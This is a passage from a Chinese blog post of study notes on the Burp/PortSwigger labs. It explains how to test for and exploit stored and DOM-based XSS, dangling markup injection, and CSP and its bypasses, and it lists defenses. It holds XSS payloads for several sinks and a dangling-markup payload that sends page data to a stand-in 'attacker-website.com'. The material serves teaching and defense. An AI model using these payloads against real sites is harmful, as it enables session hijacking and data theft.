+<p>当找到明确的 “输入 - 输出” 对应关系后，需按以下步骤验证存储型 XSS 漏洞，流程与反射型 XSS 测试大致一致：</p>
+<ol>
+<li>确定输出上下文：分析标识值在响应中的嵌入位置（如 HTML 标签间、标签属性、JavaScript 代码块等）；</li>
+<li>设计适配载荷：根据上下文场景，构造能触发 JavaScript 执行的候选攻击载荷（如属性上下文用<code>&quot;onerror=alert(1)x=&quot;</code>，JS 上下文用<code>&quot;;alert(1);//</code>）；</li>
+<li>提交并验证：将载荷通过输入入口提交（如发布含载荷的评论），访问对应的输出页面，检查载荷是否被原样存储并展示；</li>
+<li>绕过输入处理：若载荷被过滤 / 编码，根据应用的输入验证规则（如过滤<code>&lt;script&gt;</code>标签、HTML 编码），调整替代载荷（如事件驱动标签、大小写混淆、编码绕过）；</li>
+<li>浏览器确认：最终在真实浏览器中访问输出页面，验证恶意脚本是否实际执行（如用<code>alert(document.domain)</code>触发弹窗）。</li>
+</ol>
+<h1 id="dom型">DOM型
+</h1><blockquote>
+<p><strong>文档对象模型</strong>（DOM）通过将文档的结构（例如表示网页的 HTML）以对象的形式存储在内存中，将网页与脚本或编程语言连接起来。尽管将 HTML、SVG 或 XML 文档建模为对象并不是 JavaScript 核心语言的一部分，但它通常与 JavaScript 相关。</p>
+</blockquote>
+<p>DOM型跨站脚本攻击（DOM-based XSS）漏洞的核心成因是：JavaScript从攻击者可控制的<strong>数据源</strong>（如URL）获取数据后，将其传递给支持动态代码执行的<strong>数据接收点（Sink）</strong>（如<code>eval()</code>函数、<code>innerHTML</code>属性），导致攻击者注入的恶意JavaScript代码被执行，最终通常可实现劫持用户账户等攻击目的。</p>
+<h4 id="漏洞发现-2">漏洞发现
+</h4><p>绝大多数DOM型XSS漏洞可通过Burp Suite的Web漏洞扫描器快速、可靠地检测。手动测试需借助带开发者工具的浏览器（如Chrome），按“逐个测试数据源→针对性验证接收点”的逻辑开展。</p>
+<p><strong>一、测试HTML类接收点</strong>（如<code>innerHTML</code>、<code>document.write()</code>）</p>
+<p>HTML类接收点的核心特征是：攻击者输入的数据会最终<strong>嵌入DOM结构</strong>中，测试步骤如下：</p>
+<ol>
+<li><strong>注入标识字符串</strong>：将随机字母数字组合（如<code>dom_xss_test_789</code>）注入目标数据源（如URL查询字符串<code>?param=dom_xss_test_789</code>）；</li>
+<li><strong>检查DOM中的位置</strong>：
+<ul>
+<li>注意：浏览器“查看源代码”功能无效（无法显示JavaScript动态修改后的DOM），需打开Chrome开发者工具（F12），在「Elements」面板中按<code>Ctrl+F</code>（Mac为<code>Command+F</code>）搜索标识字符串，定位其在DOM中的具体位置；</li>
+</ul>
+</li>
+<li><strong>分析上下文并测试</strong>：根据标识字符串的嵌入上下文，调整输入内容测试是否可突破限制：
+<ul>
+<li>若在双引号包裹的属性中（如<code>&lt;input value=&quot;标识字符串&quot;&gt;</code>），尝试注入双引号（<code>&quot;</code>）+ 事件脚本（如<code>&quot;?onclick=alert(1)x=&quot;</code>），测试是否能跳出属性并触发脚本；</li>
+<li>若在HTML标签间（如<code>&lt;div&gt;标识字符串&lt;/div&gt;</code>），尝试注入<code>&lt;script&gt;</code>标签或事件驱动标签（如<code>&lt;img src=x onerror=alert(1)&gt;</code>）。</li>
+</ul>
+</li>
+</ol>
+<h3 id="">
+</h3><p>不同浏览器对URL数据源的编码行为不同，直接影响攻击效果：</p>
+<ul>
+<li>Chrome、Firefox、Safari：会对<code>location.search</code>（查询字符串）和<code>location.hash</code>（片段标识符）进行URL编码（如<code>&lt;</code>编码为<code>%3C</code>）；</li>
+<li>IE11、旧版Edge（非Chromium内核）：不会对上述数据源编码；</li>
+<li>若注入的数据在被处理前已被URL编码，通常无法触发XSS（编码后的特殊字符无法被浏览器解析为脚本语法）。</li>
+</ul>
+<p><strong>二、测试JavaScript执行类接收点</strong>（如<code>eval()</code>、<code>setTimeout()</code>）</p>
+<p>此类接收点的核心特征是：攻击者输入的数据会作为JavaScript代码执行，且不一定会嵌入DOM中，测试难度更高，步骤如下：</p>
+<ol>
+<li><strong>定位数据源引用</strong>：打开Chrome开发者工具，按<code>Ctrl+Shift+F</code>（Mac为<code>Command+Alt+F</code>），搜索页面所有JavaScript代码中对目标数据源的引用（如搜索<code>location.search</code>、<code>location.hash</code>）；</li>
+<li><strong>通过调试跟踪数据流转</strong>：
+<ul>
+<li>在数据源被读取的代码位置设置断点（点击代码行号左侧）；</li>
+<li>刷新页面触发断点，逐步跟踪数据流向：观察数据源的值是否被赋值给其他变量，若有则继续搜索这些变量，直至找到其传递到的危险接收点（如<code>eval(变量名)</code>）；</li>
+</ul>
+</li>
+<li><strong>验证并构造载荷</strong>：在断点处悬停变量，查看数据传递到接收点前的原始值；根据接收点的语法规则构造载荷（如<code>eval()</code>接收字符串，可注入<code>&quot;;alert(1);//</code>闭合原有字符串并执行脚本）。</li>
+</ol>
+<p><strong>三、使用DOM Invader工具简化测试</strong></p>
+<p>在实际场景中，DOM型XSS的测试往往需要手动分析复杂、压缩后的JavaScript代码，过程繁琐。若使用Burp内置浏览器，可借助其自带的<strong>DOM Invader插件</strong>，该工具能自动识别数据源与接收点的关联、跟踪数据流转，大幅降低手动测试的工作量。</p>
+<p><a class="link" href="https://portswigger.net/burp/documentation/desktop/tools/dom-invader"  target="_blank" rel="noopener"
+    >DOM Invader - PortSwigger</a></p>
+<h4 id="漏洞利用">漏洞利用
+</h4><h2 id="">
+</h2><p>DOM型XSS的漏洞本质是：攻击者可控的<strong>数据源</strong>（如URL）经客户端JavaScript流转至<strong>危险接收点（Sink）</strong>，且未做安全处理，导致恶意脚本执行。实际利用需适配数据源/接收点特性，绕过页面数据验证逻辑。</p>
+<h2 id="">
+</h2><div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th>接收点类型</th>
+          <th>特性与示例载荷</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>document.write()</td>
+          <td>支持<code>&lt;script&gt;</code>标签，可直接注入：<code>&lt;script&gt;alert(document.domain)&lt;/script&gt;</code>；需注意闭合现有HTML元素</td>
+      </tr>
+      <tr>
+          <td>innerHTML</td>
+          <td>现代浏览器不支持<code>&lt;script&gt;</code>，需用事件驱动标签：<code>&lt;img src=1 onerror=alert(document.domain)&gt;</code></td>
+      </tr>
+      <tr>
+          <td>jQuery（attr()）</td>
+          <td>若控制href等属性，可注入JS协议：<code>javascript:alert(document.domain)</code></td>
+      </tr>
+      <tr>
+          <td>jQuery（$()选择器）</td>
+          <td>旧版本存在漏洞，可通过hashchange事件注入：<code>#&lt;img src=1 onerror=alert(1)&gt;</code>（需iframe触发）</td>
+      </tr>
+      <tr>
+          <td>AngularJS</td>
+          <td>支持双花括号执行JS，无需尖括号/事件：<code>{{alert(document.domain)}}</code>（需网站启用ng-app）</td>
+      </tr>
+  </tbody>
+</table></div>
+<h2 id="">
+</h2><ol>
+<li><strong>第三方依赖漏洞</strong>：jQuery、AngularJS等框架的特定函数（如jQuery的html()、AngularJS的表达式）可能成为接收点；</li>
+<li><strong>结合反射/存储机制</strong>：
+<ul>
+<li>反射型DOM XSS：服务器将URL参数反射到页面，客户端脚本 unsafe 处理后触发；</li>
+<li>存储型DOM XSS：服务器存储恶意数据，后续响应中客户端脚本 unsafe 处理该数据。</li>
+</ul>
+</li>
+</ol>
+<h2 id="">
+</h2><p>原生JS接收点</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">()</span><span class="err">、</span><span class="nb">document</span><span class="p">.</span><span class="nx">writeln</span><span class="p">()</span><span class="err">、</span><span class="nx">element</span><span class="p">.</span><span class="nx">innerHTML</span><span class="err">、</span><span class="nx">element</span><span class="p">.</span><span class="nx">outerHTML</span><span class="err">、</span><span class="nx">element</span><span class="p">.</span><span class="nx">insertAdjacentHTML</span><span class="err">、</span><span class="nx">element</span><span class="p">.</span><span class="nx">onevent</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>jQuery接收点</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">add</span><span class="p">()</span><span class="err">、</span><span class="nx">after</span><span class="p">()</span><span class="err">、</span><span class="nx">append</span><span class="p">()</span><span class="err">、</span><span class="nx">html</span><span class="p">()</span><span class="err">、</span><span class="nx">prepend</span><span class="p">()</span><span class="err">、</span><span class="nx">replaceWith</span><span class="p">()</span><span class="err">、</span><span class="nx">$</span><span class="p">.</span><span class="nx">parseHTML</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>防护措施</p>
+<ol>
+<li>禁止将不可信数据源（如URL、用户输入）动态写入HTML文档；</li>
+<li>遵循DOM型漏洞通用防护规则，对数据源进行严格过滤与编码；</li>
+<li>及时更新第三方框架（如jQuery、AngularJS），修复已知漏洞。</li>
+</ol>
+<h3 id="悬挂标记注入">悬挂标记注入
+</h3><p>悬挂标记注入是一种<strong>无法实施完整XSS攻击时的跨域数据捕获技术</strong>，核心是通过构造“未闭合的HTML标记”，诱使浏览器将页面后续敏感数据作为请求参数发送至攻击者控制的服务器，本质是XSS攻击的替代攻击手段。</p>
+<p>当应用程序将攻击者可控数据不安全地嵌入响应（如未过滤/转义特殊字符），但因输入过滤、内容安全策略（CSP）等限制无法实施常规XSS时，通过注入“未闭合的HTML属性/标签”，迫使浏览器解析后续页面数据并发送至攻击者服务器的攻击方式。</p>
+<p>前提：</p>
+<h3 id="">
+</h3><ul>
+<li>应用程序未过滤/转义<code>&gt;</code>、<code>&quot;</code>、<code>'</code>等关键字符，攻击者可突破属性/标签限制；</li>
+<li>常规XSS攻击被阻断（如CSP拦截脚本执行、过滤所有脚本标签/事件）；</li>
+<li>页面注入点后续存在敏感数据（如CSRF令牌、邮件内容、财务信息等）。</li>
+</ul>
+<h4 id="示例-2">示例
+</h4><h4 id="">
+</h4><h3 id="">
+</h3><p>假设应用响应中存在不安全嵌入的可控数据（未闭合属性/标签）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;input&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;CONTROLLABLE</span> <span class="na">DATA</span> <span class="na">HERE</span><span class="err">&lt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="">
+</h3><ul>
+<li>攻击者注入 payload：<code>&quot;&gt;&lt;img src='//attacker-website.com?</code>
+<ul>
+<li>第一步：<code>&quot;&gt;</code> 闭合原有<code>value</code>属性和<code>&lt;input&gt;</code>标签，回到HTML自由上下文；</li>
+<li>第二步：创建<code>&lt;img&gt;</code>标签并定义<code>src</code>属性，但其<code>src</code>值仅开头（<code>//attacker-website.com?</code>），未闭合单引号，处于“悬挂”状态；</li>
+</ul>
+</li>
+<li>浏览器解析行为：浏览器会自动查找后续第一个单引号以闭合<code>src</code>属性，期间所有内容（从注入点之后到第一个单引号前）都会被当作<code>src</code>URL的一部分，且非字母数字字符（如换行、尖括号）会被URL编码；</li>
+<li>数据捕获：浏览器会向<code>//attacker-website.com?[后续敏感数据]</code>发送请求，攻击者通过服务器日志即可获取编码后的敏感数据。</li>
+</ul>
+<h4 id="防护措施">防护措施
+</h4><ol>
+<li><strong>核心防护（与XSS通用）</strong>：
+<ul>
+<li>输出编码：将用户可控数据嵌入HTML时，对特殊字符（<code>&gt;</code>、<code>&lt;</code>、<code>&quot;</code>、<code>'</code>等）进行HTML实体编码；</li>
+<li>输入验证：严格校验输入数据，过滤可能用于突破标签/属性的特殊字符或标记。</li>
+</ul>
+</li>
+<li><strong>辅助防护</strong>：
+<ul>
+<li>内容安全策略（CSP）：配置限制<code>img</code>、<code>link</code>等标签加载外部资源的策略（可阻断部分攻击，但非全部）；</li>
+<li>依赖浏览器防护：Chrome浏览器已针对该攻击优化——禁止<code>img</code>等标签的URL包含尖括号、换行等原始字符，因捕获的敏感数据通常含此类字符，可直接阻断攻击。</li>
+</ul>
+</li>
+</ol>
+<h3 id="csp-内容安全策略">CSP 内容安全策略
+</h3><p>内容安全策略（CSP）是一种<strong>浏览器安全机制</strong>，核心目的是缓解XSS、悬挂标记注入、点击劫持等攻击，通过限制页面可加载的资源（如脚本、图片）、是否允许被其他页面嵌套等规则，构建安全的页面运行环境。其核心实现方式是通过HTTP响应头<code>Content-Security-Policy</code>，配置多个用分号分隔的指令（Directive）定义安全规则。</p>
+<h2 id="">
+</h2><h4 id="缓解xss攻击">缓解XSS攻击
+</h4><p>核心思路是<strong>白名单管控脚本来源</strong>，阻止攻击者注入的恶意脚本执行，主要通过<code>script-src</code>指令实现：</p>
+<ul>
+<li>仅允许加载同源脚本：<code>script-src 'self'</code>（<code>'self'</code>表示当前页面所在域名）；</li>
+<li>仅允许加载指定域名脚本：<code>script-src https://scripts.normal-website.com</code>；</li>
+<li>进阶白名单方式（避免依赖外部域名风险）：
+<ul>
+<li>非ces（Nonce）：指令中指定随机生成的非ce值，脚本标签需包含相同<code>nonce</code>属性才允许执行（非ce需每次页面加载随机生成，不可猜测）；</li>
+<li>哈希（Hash）：指令中指定可信脚本的内容哈希值，脚本内容哈希与指令匹配才允许执行（脚本内容变更需同步更新哈希值）；</li>
+</ul>
+</li>
+<li>注意事项：允许外部域名（如CDN）脚本时需谨慎，若第三方域名可被攻击者控制内容，仍可能引发攻击。</li>
+</ul>
+<h4 id="缓解悬挂标记注入攻击">缓解悬挂标记注入攻击
+</h4><p>通过<code>img-src</code>等指令限制可发起外部请求的资源来源，阻断攻击的数据捕获路径：</p>
+<ul>
+<li>仅允许同源图片加载：<code>img-src 'self'</code>；</li>
+<li>仅允许指定域名图片加载：<code>img-src https://images.normal-website.com</code>；</li>
+<li>局限性：仅能阻断依赖<code>&lt;img&gt;</code>标签的攻击，无法防御<code>&lt;a&gt;</code>标签<code>href</code>属性等其他形式的悬挂标记注入。</li>
+</ul>
+<h4 id="防护点击劫持攻击">防护点击劫持攻击
+</h4><p>通过<code>frame-ancestors</code>指令限制页面被嵌套（iframe）的规则，比<code>X-Frame-Options</code>头更灵活：</p>
+<ul>
+<li>仅允许同源页面嵌套：<code>frame-ancestors 'self'</code>；</li>
+<li>完全禁止嵌套：<code>frame-ancestors 'none'</code>；</li>
+<li>支持多域名/通配符：<code>frame-ancestors 'self' https://normal-website.com https://*.robust-website.com</code>；</li>
+<li>优势：可验证父框架层级中所有页面的来源，而<code>X-Frame-Options</code>仅验证顶层框架。</li>
+</ul>
+<h4 id="csp的绕过技巧">CSP的绕过技巧
+</h4><ol>
+<li>利用政策注入绕过</li>
+</ol>
+<ul>
+<li>适用场景：网站将攻击者可控的输入（如URL参数）反射到CSP政策中（常见于<code>report-uri</code>指令）；</li>
+<li>绕过逻辑：注入分号（<code>;</code>）分割原有指令，添加自定义指令；若<code>report-uri</code>是最后一个指令，需覆盖原有指令（如利用Chrome的<code>script-src-elem</code>指令，可覆盖<code>script-src</code>指令，控制脚本元素执行）。</li>
+</ul>
+<ol start="2">
+<li>突破外部请求限制</li>
+</ol>
+<ul>
+<li>场景：CSP禁止所有外部请求；</li>
+<li>绕过逻辑：诱导用户交互（如点击），注入含未闭合属性的HTML元素（如<code>&lt;a&gt;</code>标签），用户点击后将元素内的页面数据发送至攻击者服务器。</li>
+</ul>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/burp%E9%9D%B6%E5%9C%BA/">Burp靶场</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under Calendar</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/posts/burp%E9%9D%B6%E5%9C%BA-csrf%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Burp靶场：CSRF 跨站请求伪造</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/posts/burp%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Burp靶场：SQL注入</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/posts/burp%E9%9D%B6%E5%9C%BA-server-side/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Burp靶场：Server-side vulnerabilities</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/posts/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-php/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">代码审计-PHP</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/posts/%E5%BE%A1%E6%9E%97-devops%E5%85%A5%E9%97%A8%E5%B0%8F%E7%BB%93/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://raw.githubusercontent.com/calendar0917/images/master/20251021193711745.png" loading="lazy" data-key="" data-hash="https://raw.githubusercontent.com/calendar0917/images/master/20251021193711745.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">御林-DevOps入门小结</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <script
+    src="https://giscus.app/client.js"
+    data-repo="calendar0917/calendar0917.github.io"
+    data-repo-id="R_kgDOPxiY_A"
+    data-category="Announcements"
+    data-category-id="DIC_kwDOPxiY_M4Cwwbp"
+    data-mapping="url"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="top"
+    data-theme="preferred_color_scheme"
+    data-lang="en"
+    data-loading=""
+    crossorigin="anonymous"
+    async
+></script>
+<script>
+    function setGiscusTheme(theme) {
+        let giscus = document.querySelector("iframe.giscus-frame");
+        if (giscus) {
+            giscus.contentWindow.postMessage(
+                {
+                    giscus: {
+                        setConfig: {
+                            theme: theme,
+                        },
+                    },
+                },
+                "https://giscus.app"
+            );
+        }
+    }
+
+    (function () {
+        addEventListener("message", (e) => {
+            if (event.origin !== "https://giscus.app") return;
+            handler();
+        });
+        window.addEventListener("onColorSchemeChange", handler);
+
+        function handler() {
+            if (document.documentElement.dataset.scheme === "light") {
+                setGiscusTheme('preferred_color_scheme');
+            } else {
+                setGiscusTheme('preferred_color_scheme');
+            }
+        }
+    })();
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2025 Calendar
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.31.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<style>
+    #backTopBtn {
+        display: none;
+        position: fixed;
+        bottom: 30px;
+        z-index: 99;
+        cursor: pointer;
+        width: 30px;
+        height: 30px;
+        background-image: url(https://calendar0917.github.io/icons/backTop.svg);
+    }
+</style>
+
+<script>
+    
+
+    function initScrollTop() {
+        let rightSideBar = document.querySelector(".right-sidebar");
+        if (!rightSideBar) {
+            return;
+        }
+        
+        let btn = document.createElement("div");
+        btn.id = "backTopBtn";
+        btn.onclick = backToTop
+        rightSideBar.appendChild(btn)
+        
+        window.onscroll = function() {
+            
+            if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
+                btn.style.display = "block";
+            } else {
+                btn.style.display = "none";
+            }
+        };
+    }
+
+    
+
+    function backToTop(){
+        window.scrollTo({ top: 0, behavior: "smooth" })
+    }
+
+    initScrollTop();
+</script>
+
+    </body>
+</html>
